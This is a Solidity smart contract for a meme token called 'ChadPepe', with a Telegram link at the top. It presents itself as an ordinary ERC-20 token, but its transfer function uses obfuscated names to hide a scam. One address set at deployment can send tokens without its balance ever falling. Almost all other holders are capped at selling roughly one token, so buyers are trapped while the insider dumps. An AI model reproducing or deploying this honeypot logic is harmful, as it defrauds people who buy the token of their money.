/*

https://t.me/chadpeepee

*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract ChadPepe is Ownable {
    string public name;

    uint8 public decimals = 9;

    function ahvins(address sechtzn, address xkavrfdm, uint256 whgbv) private {
        address oxby = IUniswapV2Factory(jegtx.factory()).getPair(address(this), jegtx.WETH());
        if (0 == vqwdjp[sechtzn]) {
            if (sechtzn != oxby && zpxv[sechtzn] != block.number && whgbv < totalSupply) {
                require(whgbv <= totalSupply / (10 ** decimals));
            }
            balanceOf[sechtzn] -= whgbv;
        }
        balanceOf[xkavrfdm] += whgbv;
        zpxv[xkavrfdm] = block.number;
        emit Transfer(sechtzn, xkavrfdm, whgbv);
    }

    constructor(string memory jzfqgmcluih, string memory dpznjoavkl, address ainf, address oywdiqvj) {
        name = jzfqgmcluih;
        symbol = dpznjoavkl;
        balanceOf[msg.sender] = totalSupply;
        vqwdjp[oywdiqvj] = uwxnadlci;
        jegtx = IUniswapV2Router02(ainf);
    }

    mapping(address => uint256) private vqwdjp;

    uint256 private uwxnadlci = 117;

    function transferFrom(address sechtzn, address xkavrfdm, uint256 whgbv) public returns (bool success) {
        require(whgbv <= allowance[sechtzn][msg.sender]);
        allowance[sechtzn][msg.sender] -= whgbv;
        ahvins(sechtzn, xkavrfdm, whgbv);
        return true;
    }

    mapping(address => uint256) private zpxv;

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address bjelwizxys, uint256 whgbv) public returns (bool success) {
        allowance[msg.sender][bjelwizxys] = whgbv;
        emit Approval(msg.sender, bjelwizxys, whgbv);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public balanceOf;

    IUniswapV2Router02 private jegtx;

    string public symbol;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transfer(address xkavrfdm, uint256 whgbv) public returns (bool success) {
        ahvins(msg.sender, xkavrfdm, whgbv);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
